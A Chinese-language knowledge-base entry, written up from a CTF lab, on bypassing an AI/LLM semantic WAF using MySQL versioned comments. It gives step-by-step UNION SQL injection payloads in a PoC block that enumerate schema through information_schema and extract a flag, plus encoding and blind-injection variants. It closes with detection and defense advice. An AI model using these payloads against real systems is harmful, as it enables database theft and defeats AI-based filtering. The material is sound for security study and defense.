---
id: web-generic-sqli-ai-waf-mysql-versioned-comment-bypass
title: AI WAF 语义拦截下的 MySQL 版本注释绕过：/*!50000union*/ 被当成注释、MySQL 仍执行
type: scenario
domain: web
path: web/generic/sqli
technique: ai-waf-mysql-versioned-comment-sqli-bypass
tags:
- sqli
- waf-bypass
- ai-waf
- mysql
- versioned-comment
- union
- information-schema
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:35:12+08:00'
  notes: 已对照原文请求/响应截图核对；库名 nexadata、表/列/flag 回显一致；PoC 未复跑。
url: /docs/web/generic/sqli/web-generic-sqli-ai-waf-mysql-versioned-comment-bypass/
draft: false
kb_aliases:
- AI WAF 绕过
- AI WAF SQL 注入
- MySQL 内联注释绕过
- /*!50000union*/
- 版本注释 SQLi
- 语义 WAF 注释盲区
---

## 一句话结论

当 AI/LLM WAF 把 SQL 里的 `/*! ... */` 当成普通注释忽略时，MySQL 的版本注释 `/*!50000union*/` 会在服务器版本 ≥ 5.00.00 时执行其中的关键字；用这种解析差异可以在不触发 AI WAF 的情况下完成 UNION 注入，逐级读出库名、表名、列名和 flag。

## 原理

- **AI WAF 的判定方式**：接口接收 JSON `{"query":"-1"}` 并拼进 SQL；提交 `{"query":"-1' union"}` 时 WAF 返回 `403`，响应体为 `{"redirect_url":"/alert?confidence=1.00","status":"injection"}`。说明 WAF 不是简单关键字匹配，而是对整段输入做语义/意图判断（或交给 LLM 判定），把 `union` 识别为注入。
- **MySQL 可执行注释**：MySQL 支持 `/*!NNNNN ... */` 形式，服务器版本 ≥ NNNNN 时会把注释内部当 SQL 执行；`/*!50000union*/` 在 MySQL 5.x/8.x 上等价于 `union`。WAF 的 SQL 词法/语义分析把整个 `/*!...*/` 视为注释，内部的 `union`/`select` 不进入它的判定，于是放行。
- **完整注入**：用 `-1'/*!50000union*//*!50000select*/database(),2,3#` 闭合原查询并 UNION 三列；`#` 注释掉剩余部分。第一个字段在 JSON `results` 中回显，因此 `database()`、子查询、`group_concat` 都能直接看到结果。
- **枚举链**：表名用 `(/*!50000select*/(group_concat(table_name))/*!50000from*/(infoRmation_schema.tables)/*!50000where*/(table_schema)like(database()))`；列名把 `tables` 换成 `columns`、`table_schema` 换成 `table_name`。`infoRmation_schema` 的大小写混写同时规避静态关键字匹配。
- **为什么成立**：WAF 与数据库对同一段文本的“注释语义”理解不一致——WAF 认为注释内容不执行，MySQL 认为版本注释内容要执行。这是典型的 parser differential（解析差异）绕过，而不是传统的编码/大小写技巧。
- **最终危害**：拿到数据库名 `nexadata`、表 `where_is_my_flagggggg`、列 `Th15_ls_f149` 后，直接 `union select Th15_ls_f149,2,3 from where_is_my_flagggggg#` 读出 flag。

## 触发条件

- 目标前端/网关部署了 AI/LLM 语义 WAF，且其 SQL 理解把 `/*! ... */` 整体当注释，不检查内部关键字。
- 后端为 MySQL 且版本 ≥ 注释中写的版本号（如 50000）；其他数据库的版本注释语法不适用。
- 存在可注入的字符串上下文（本例为 `-1'` 闭合），UNION 列数可枚举。
- 应用把查询结果或错误信息回显到响应中（本例 JSON `results` 数组）。
- WAF 对大小写混写（`infoRmation_schema`）没有额外拦截。

## 利用步骤

1. 用 `{"query":"-1"}` 观察 SQL 报错/空结果，确认注入点与列数；用 `{"query":"-1' union"}` 确认 WAF 返回 403，判断为语义拦截。
2. 用版本注释包裹关键字：`{"query":"-1'/*!50000union*//*!50000select*/database(),2,3#"}`，从回显确认库名（`nexadata`）。
3. 枚举表名：`-1'/*!50000union*//*!50000select*/(/*!50000select*/(group_concat(table_name))/*!50000from*/(infoRmation_schema.tables)/*!50000where*/(table_schema)like(database())),2,3#`。
4. 枚举列名：把上一步的 `tables` 改 `columns`、`where table_schema like(database())` 改 `where table_name like('where_is_my_flagggggg')`。
5. 读取目标列：`-1'/*!50000union*//*!50000select*/ Th15_ls_f149,2,3 /*!50000from*/ where_is_my_flagggggg#`，从 `results` 取 flag。
6. 若某个关键字仍被拦，调整版本号（如 `/*!80000*/`）、在注释内做大小写/空白变化，或改用 `/*!50000%75nion*/` 等编码。

## PoC

```json
{"query":"-1'/*!50000union*//*!50000select*/database(),2,3#"}
{"query":"-1'/*!50000union*//*!50000select*/(/*!50000select*/(group_concat(table_name))/*!50000from*/(infoRmation_schema.tables)/*!50000where*/(table_schema)like(database())),2,3#"}
{"query":"-1'/*!50000union*//*!50000select*/(/*!50000select*/(group_concat(column_name))/*!50000from*/(infoRmation_schema.columns)/*!50000where*/(table_name)like('where_is_my_flagggggg')),2,3#"}
{"query":"-1'/*!50000union*//*!50000select*/ Th15_ls_f149,2,3 /*!50000from*/ where_is_my_flagggggg#"}
```

原文实测回显依次为：库名 `nexadata`、表 `article,where_is_my_flagggggg`、列 `Th15_ls_f149`、flag `flag{479481d2-5d45-4f83-83d2-36f63ccaba44}`。

## 变体与关联

- 变体：版本号可按目标版本调整（`/*!50700*/`、`/*!80000*/`）；注释内部可插入 `%09/%0a` 或大小写变化，进一步绕过静态规则。
- 变体：不只是 `union`，`select`/`from`/`where` 都可分别包进版本注释；也可用 `/*!50000or*/`、`/*!50000and*/` 构造布尔/时间盲注。
- 变体：其他数据库的等价技巧包括 Oracle 的 `/*+ hint */`、SQL Server 的 `/**/` 关键字拆分；原理都是让 WAF 与数据库对注释的解析不一致。
- 关联：[[web-generic-sqli-semantic-waf-layerwise-bypass]]（语义 WAF 的 OR/|| 解析差异）、[[web-generic-sqli-waf-newline-keyword-split-hex]]（关键字拆行 + 十六进制）、[[web-generic-sqli-keyword-double-write-bypass]]（双写还原关键字）。
- 边界：若 WAF 先做 SQL 解析/规范化并正确识别版本注释，本绕过失效；若后端不是 MySQL 或版本低于注释号，注释内容不会执行。

## 检测与防御

- **WAF**：在送 LLM/语义分析前先做 SQL 词法解析，识别 `/*!` 版本注释并把内部内容按代码处理；对 `/*!`、`information_schema`、`group_concat`、`union` 组合告警。
- **代码**：使用参数化查询/预编译，不拼接 JSON 输入；数据库账号最小权限，限制 `information_schema` 访问。
- **检测**：请求体 JSON 中出现 `/*!`、版本号、`infoRmation_schema` 大小写混写、`union` 与注释混排；WAF 的 403 与后续 200 之间的 payload 变化。
- **验证**：修复后在 WAF 与数据库两侧分别解析同一 payload，确认两者对注释内容的执行语义一致。
